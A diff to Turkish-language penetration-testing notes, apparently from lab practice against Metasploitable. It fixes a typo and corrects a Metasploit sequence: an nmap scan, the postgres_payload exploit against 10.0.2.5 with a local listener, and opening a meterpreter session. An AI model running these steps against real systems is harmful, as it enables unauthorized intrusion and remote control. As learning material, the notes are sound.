@@ -68,7 +68,7 @@ nmap → temel
 
 **_Sunucu-Bilgisayar Hackleme_**
 
-- porları exploitdb/rapid7 sitelerinden açık var mı bak
+- portları exploitdb/rapid7 sitelerinden açık var mı bak
 
 * portlar değil servisler hacklenir
   ~nmap -v -sS -A -T4 target //sonuçlar kaydedilip açık portlarla sızma denemeleri yapılır.Metasploitable a
@@ -130,12 +130,11 @@ ls
 ~msfconsole
 ~msf6> use exploit/linux/postgres/postgres_payload
 msf6 exploit(linux/postgres/postgres_payload) > show options
-msf6 exploit(multi/samba/usermap_scrip) > show options
-msf6 exploit(multi/samba/usermap_scrip) > set rhosts 10.0.2.5
-msf6 exploit(multi/samba/usermap_scrip) > set lhost 10.0.2.5 //localhost kendi ip
-msf6 exploit(multi/samba/usermap_scrip) > exploit -j -z
-msf6 exploit(multi/samba/usermap_scrip) > sessions -l
-msf6 exploit(multi/samba/usermap_scrip) > sessions 1
+msf6 exploit(linux/postgres/postgres_payload) > set rhosts 10.0.2.5
+msf6 exploit(linux/postgres/postgres_payload) > set lhost 10.0.2.2 //localhost kendi ip
+msf6 exploit(linux/postgres/postgres_payload) > exploit -j -z
+msf6 exploit(linux/postgres/postgres_payload) > sessions -l
+msf6 exploit(linux/postgres/postgres_payload) > sessions 1
 
 meterpreter > //açılır
 meterpreter > help //yapabileceklerin çıkar
